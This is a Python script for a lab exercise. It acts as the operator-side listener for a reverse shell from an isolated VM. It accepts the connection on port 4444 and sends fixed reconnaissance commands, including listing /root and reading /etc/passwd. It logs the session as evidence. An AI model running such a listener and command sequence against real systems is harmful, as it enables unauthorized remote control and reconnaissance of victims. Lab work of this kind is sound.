#!/usr/bin/env python3
"""
c2_listener.py — analyst-side handler for the lab reverse shell.

Runs on the HOST (192.168.116.1) and receives the connection from the
isolated lab VM. Simulates a minimal "operator console": sends a fixed,
non-interactive command sequence through the shell and writes the whole
session (with timestamps) to an evidence log.

Usage: python c2_listener.py <evidence-log-path>
"""
import socket
import sys
import time

LOG = sys.argv[1] if len(sys.argv) > 1 else "reverse_session.log"
BIND_IP, PORT = "192.168.116.1", 4444

COMMANDS = [
    ("id", 1.5),
    ("uname -a", 1.0),
    ("hostname", 0.8),
    ("pwd", 0.5),
    ("whoami", 0.5),
    ("ls -la /root", 0.8),
    ("cat /tmp/c2_beacon.txt", 0.8),
    ("tail -5 /etc/passwd", 0.8),
]

log = open(LOG, "a", buffering=1)


def w(line):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    out = f"[{ts}] {line}"
    print(out)
    log.write(out + "\n")


def drain(sock, buf, seconds=2.0):
    """Collect everything the shell sends within `seconds`."""
    sock.settimeout(seconds)
    deadline = time.time() + seconds
    try:
        while time.time() < deadline:
            data = sock.recv(4096)
            if not data:
                break
            buf += data
    except (socket.timeout, ConnectionResetError):
        pass
    return buf


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((BIND_IP, PORT))
srv.listen(1)
w(f"[LISTENER] waiting for reverse shell on {BIND_IP}:{PORT}")

srv.settimeout(180)
try:
    conn, addr = srv.accept()
except socket.timeout:
    w("[TIMEOUT] no connection received")
    sys.exit(1)

w(f"[CONNECT] reverse shell connected from {addr[0]}:{addr[1]}")

buf = drain(conn, b"")
w(f"[BANNER] {buf.decode(errors='replace').strip()!r}")

for cmd, wait in COMMANDS:
    buf = drain(conn, b"", wait + 1.5)
    conn.sendall((cmd + "\n").encode())
    time.sleep(wait)
    buf = drain(conn, b"")
    w(f"[CMD] {cmd}\n[OUT] {buf.decode(errors='replace').strip()}")

w("[DONE] closing session")
conn.close()
srv.close()
